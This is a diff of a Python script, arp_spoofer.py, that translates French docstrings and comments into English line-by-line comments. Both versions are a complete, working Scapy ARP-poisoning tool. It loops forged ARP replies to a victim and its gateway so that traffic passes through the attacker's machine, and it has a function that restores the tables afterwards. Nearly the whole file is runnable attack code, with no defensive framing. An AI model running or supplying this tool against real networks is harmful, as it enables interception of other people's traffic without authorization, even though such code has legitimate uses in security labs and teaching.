@@ -1,57 +1,39 @@
-# arp_spoofer.py
+from scapy.all import ARP, Ether, sendp  # Importing necessary Scapy components
+import time  # Used to pause between sending packets
 
-from scapy.all import ARP, Ether, sendp
-import time
-
-def build_arp_packet(src_ip, src_mac, dst_ip, dst_mac):
-    """
-    Construit un paquet ARP pour usurper une IP.
-    src_ip: IP à usurper
-    src_mac: MAC de l'attaquant
-    dst_ip: cible du spoofing
-    dst_mac: MAC de la cible
-    """
-    ether = Ether(dst=dst_mac, src=src_mac)
-    arp = ARP(op=2, psrc=src_ip, pdst=dst_ip, hwsrc=src_mac, hwdst=dst_mac)
-    return ether / arp
+def build_arp_packet(src_ip, src_mac, dst_ip, dst_mac):  # Builds a spoofed ARP packet
+    ether = Ether(dst=dst_mac, src=src_mac)  # Ethernet layer with source and destination MAC
+    arp = ARP(op=2, psrc=src_ip, pdst=dst_ip, hwsrc=src_mac, hwdst=dst_mac)  # ARP reply with spoofed info
+    return ether / arp  # Combine Ethernet and ARP layers
 
 def start_arp_spoofing(victim_ip, victim_mac, gateway_ip, gateway_mac, attacker_mac, iface, interval=2):
-    """
-    Démarre l’attaque ARP entre la victime et la passerelle.
-    """
-    print("[*] Starting ARP spoofing...")
+    print("[*] Starting ARP spoofing...")  # Starting message
+
     try:
-        while True:
-            # Empoisonner la victime : on se fait passer pour la passerelle
-            pkt_to_victim = build_arp_packet(gateway_ip, attacker_mac, victim_ip, victim_mac)
-            # Empoisonner la passerelle : on se fait passer pour la victime
-            pkt_to_gateway = build_arp_packet(victim_ip, attacker_mac, gateway_ip, gateway_mac)
+        while True:  # Loop until user stops manually
+            pkt_to_victim = build_arp_packet(gateway_ip, attacker_mac, victim_ip, victim_mac)  # Pretend to be gateway
+            pkt_to_gateway = build_arp_packet(victim_ip, attacker_mac, gateway_ip, gateway_mac)  # Pretend to be victim
 
-            sendp(pkt_to_victim, iface=iface, verbose=False)
-            sendp(pkt_to_gateway, iface=iface, verbose=False)
+            sendp(pkt_to_victim, iface=iface, verbose=False)  # Send spoofed packet to victim
+            sendp(pkt_to_gateway, iface=iface, verbose=False)  # Send spoofed packet to gateway
 
-            print(f"[+] Sent ARP spoof packets to {victim_ip} and {gateway_ip}")
-            time.sleep(interval)
+            print("[+] Sent ARP spoof packets to", victim_ip, "and", gateway_ip)  # Confirmation message
+            time.sleep(interval)  # Wait before sending next round
 
-    except KeyboardInterrupt:
-        print("\n[!] Spoofing interrupted by user.")
-        restore_arp(victim_ip, victim_mac, gateway_ip, gateway_mac, iface)
-        print("[+] ARP tables restored.")
+    except KeyboardInterrupt:  # Stop with Ctrl+C
+        print("\n[!] Spoofing interrupted by user.")  # Notification of interruption
+        restore_arp(victim_ip, victim_mac, gateway_ip, gateway_mac, iface)  # Restore ARP tables
+        print("[+] ARP tables restored.")  # Final confirmation
 
-def restore_arp(victim_ip, victim_mac, gateway_ip, gateway_mac, iface):
-    """
-    Restaure les tables ARP des machines après l’attaque.
-    """
-    print("[*] Restoring ARP tables...")
+def restore_arp(victim_ip, victim_mac, gateway_ip, gateway_mac, iface):  # Sends real ARP info to fix tables
+    print("[*] Restoring ARP tables...")  # Info message
 
-    # On renvoie les vraies associations
-    pkt1 = build_arp_packet(gateway_ip, gateway_mac, victim_ip, victim_mac)
-    pkt2 = build_arp_packet(victim_ip, victim_mac, gateway_ip, gateway_mac)
+    pkt1 = build_arp_packet(gateway_ip, gateway_mac, victim_ip, victim_mac)  # Real gateway → victim
+    pkt2 = build_arp_packet(victim_ip, victim_mac, gateway_ip, gateway_mac)  # Real victim → gateway
 
-    # On envoie plusieurs fois pour assurer la propagation
-    for _ in range(5):
+    for _ in range(5):  # Send multiple times to ensure delivery
         sendp(pkt1, iface=iface, verbose=False)
         sendp(pkt2, iface=iface, verbose=False)
         time.sleep(1)
 
-    print("[+] ARP tables restored successfully.")
+    print("[+] ARP tables restored successfully.")  # Success message
